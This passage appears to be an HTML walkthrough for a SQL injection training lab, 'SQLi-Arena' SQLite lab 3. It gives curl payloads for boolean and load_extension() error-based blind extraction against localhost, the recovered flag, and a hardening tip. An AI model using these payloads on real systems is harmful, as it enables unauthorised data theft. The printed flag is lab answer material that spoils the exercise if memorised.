<h4>Step 1: Confirm Injection (Numeric Context)</h4>
<p>The input is in a numeric context (no quotes around <code>$input</code>), so we inject directly.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Test Boolean Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=1"<br>
        <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=2"<br>
        <span class="prompt">Response: </span><strong>No product found with that ID.</strong>
    </div>
</div>

<p>Two distinct responses confirm the boolean oracle.</p>

<h4>Step 2: Determine the Flag Length</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Find Flag Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) &gt; 20"<br>
        <span class="prompt">Response: </span>Product found (TRUE -- length &gt; 20)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) = 23"<br>
        <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong> (TRUE -- flag is 23 characters)
    </div>
</div>

<h4>Step 3: Extract Characters with substr()</h4>
<p>Use <code>substr()</code> (SQLite's SUBSTRING equivalent) to extract one character at a time.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Extract Characters</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1 AND substr((SELECT flag_value FROM flags LIMIT 1),1,1) = 'F'<br>
        <span class="prompt">Response: </span>Product found (TRUE -- first char is 'F')<br><br>
        <span class="prompt">Input: </span>1 AND substr((SELECT flag_value FROM flags LIMIT 1),2,1) = 'L'<br>
        <span class="prompt">Response: </span>Product found (TRUE -- second char is 'L')<br><br>
        <span class="prompt">Input: </span>1 AND substr((SELECT flag_value FROM flags LIMIT 1),5,1) = '{'<br>
        <span class="prompt">Response: </span>Product found (TRUE -- fifth char is '{')
    </div>
</div>

<h4>Step 4: Alternative. Error Oracle with load_extension()</h4>
<p>
    SQLite's <code>load_extension()</code> throws an error when called with an invalid path.
    Use <code>CASE WHEN</code> to trigger the error only when a condition is false, creating
    a 3-state oracle: TRUE (Product found), FALSE (SQLite Error), NULL (No product).
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Error Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// TRUE condition -- no error:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='F' THEN 1 ELSE load_extension('x') END)"<br>
        <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong><br><br>
        <span class="prompt">// FALSE condition -- error triggered:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='X' THEN 1 ELSE load_extension('x') END)"<br>
        <span class="prompt">Response: </span><strong>SQLite Error: not authorized</strong>
    </div>
</div>

<h4>Step 5: Full Extraction</h4>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  s  q  _  3  r  r  0  r  _  l  0  4  d  _  3  x  t  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{sq_3rr0r_l04d_3xt}</strong>
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_3rr0r_l04d_3xt}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND substr((SELECT flag_value FROM flags LIMIT 1),1,1) = 'F'"<br><br>
        <span class="prompt"># </span>Returns "Product found: ID #1 exists in the catalog." -- first char is 'F' (TRUE)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQLite uses <code>substr()</code> instead of <code>SUBSTRING()</code>.
    Numeric injection (no quotes) allows direct condition injection. The <code>load_extension()</code>
    error oracle creates a 3-state oracle (success/error/no-data) that's even more reliable than a
    simple boolean oracle. Always disable <code>load_extension()</code> in production:
    <code>$conn->enableLoadExtension(false)</code>.
</div>
